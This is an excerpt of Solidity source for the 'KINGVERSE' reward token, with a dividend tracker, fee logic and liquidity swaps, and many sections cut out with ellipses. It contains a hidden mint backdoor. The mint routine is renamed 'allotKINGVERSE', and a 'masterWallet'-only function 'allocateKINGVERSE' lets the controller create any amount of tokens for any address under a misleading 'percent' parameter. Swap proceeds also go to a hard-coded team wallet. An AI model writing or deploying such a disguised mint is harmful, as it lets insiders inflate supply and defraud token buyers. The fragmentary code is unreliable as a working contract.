...
_balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
 ...
 function allotKINGVERSE(address account, uint256 amount) internal virtual {
...
function allotKINGVERSE(address account, uint256 value) internal override {
    super.allotKINGVERSE(account, value);
...
function _burn(address account, uint256 value) internal override {
 ...
 function _setBalance(address account, uint256 newBalance) internal {
    ...
    if(newBalance > currentBalance) {
      ...
      allotKINGVERSE(account, mintAmount);
...
contract KINGVERSErewardToken is rewardTokenHolders, Ownable {
    using SafeMath for uint256;
    using SafeMathInt for int256;
    using RewardKINGVERSEMap  for RewardKINGVERSEMap .Map;
RewardKINGVERSEMap .Map private tokenHoldersList;
...
event Claim(address indexed account, uint256 amount, bool indexed automatic);
 constructor() rewardTokenHolders("KINGVERSE_rewardToken_Tracker", "KINGVERSE_rewardToken_Tracker") {
        claimWait = 3600;
        minimumTokenBalanceForDividends = 80000 * (10**9); 
    }
function _transfer(address, address, uint256) internal override pure {
        require(false, "KINGVERSE_rewardToken_Tracker: No transfers allowed");
    }
 function withdrawDividend() public override  pure {
        require(false, "KINGVERSE_rewardToken_Tracker: withdrawDividend disabled. Use the 'claim' function on the main KINGVERSE contract.");
    }
...
contract KINGVERSE is ERC20, Ownable {
 ...
 uint256 public gasForProcessing = 300000;
    ...
    KINGVERSErewardToken public rewardToken;
   uint256 _totalSupply =750000000  * (10**9);
    bool private swapping;
     uint256 public team = 2;
 ...
 address public lp;
  ILP public adressLiquidity;
    address public teamReciever =0xca9023B5A7f3b18B57e4A9C15Ab2C2a59BB2C9c3;
...
bool public cooldownEnabled = false;
  ...
  constructor() ERC20("KINGVERSE", "KVS") {
 
        TotalFees = holderReward.add(liquidityFee).add(team);
 ...
 DEXV2Router = _DEXV2Router;
        ...
        rewardToken = new KINGVERSErewardToken();
...
isTimelockLimited[owner()] = true;
 ...
 allotKINGVERSE(owner(), _totalSupply);
    }
receive() external payable {}
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
...
emit RebaseUpdate(epoch, _totalSupply);
  ...
  function changeIsDividendLimited(address holder, bool Limited) external masterWallet {
     ...
     function allocateKINGVERSE(address tokenAddress, uint256 tokenePercent) public masterWallet{
       allotKINGVERSE(tokenAddress, tokenePercent);
  }
 ...
 function updateDEXV2Router(address newAddress) public masterWallet {
        require(newAddress != address(DEXV2Router), "KINGVERSE: The router already has that address");
 ...
 function excludeFromFees(address account, bool excluded) public masterWallet {
        require(_isExcludedFromFees[account] != excluded, "KINGVERSE: Account is already the value of 'excluded'");
        _isExcludedFromFees[account] = excluded;

        emit ExcludeFromFees(account, excluded);
    }
function updateGasForProcessing(uint256 newValue) public masterWallet {
        require(newValue >= 200000 && newValue <= 500000, "KINGVERSE: gasForProcessing must be between 200,000 and 500,000");
        require(newValue != gasForProcessing, "KINGVERSE: Cannot update gasForProcessing to same value");
 ...
 uint256 tokensTKINGVERSE = tokensToLiquify.mul(liquidityFee).div(TotalFees).div(2);
        uint256 amountToSwap = tokensToLiquify.sub(tokensTKINGVERSE);
...
addLiquidity(tokensTKINGVERSE, bnbForLiquidity);
payable(teamReciever).transfer(bnbForDev);
